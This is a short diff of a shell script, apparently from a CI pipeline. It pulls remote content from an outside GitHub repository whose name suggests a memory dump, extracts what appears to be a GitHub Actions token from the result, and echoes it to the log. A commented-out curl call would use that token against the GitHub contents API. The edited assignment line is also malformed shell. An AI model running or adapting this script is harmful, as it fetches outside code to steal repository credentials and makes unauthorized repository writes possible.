@@ -8,16 +8,15 @@ TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum
 echo "---------------------------1--------------------------------------"
 echo "$TOKEN_VAL"
 echo "---------------------------2--------------------------------------"
-echo "$TOKEN_VAL" | awk 'NR==2' 
+ghsToken = $(echo "$TOKEN_VAL" | awk 'NR==2')
 echo "---------------------------3--------------------------------------"
-NewTk = "$TOKEN_VAL"
-echo $NewTk
+echo $ghsToken
 echo "---------------------------4--------------------------------------"
 
 #echo "$TOKEN_VAL" | sed 's/[^a-zA-Z0-9]//g'
 #curl \
 #    -H "Accept: application/vnd.github.v3+json" \
-#    -H "Authorization: token $NewTk" \
+#    -H "Authorization: token $ghsToken" \
 #    -H "X-GitHub-Api-Version: 2022-11-28" \
 #    --url "https://api.github.com/repos/${REPO}/contents/README1.md" \
     
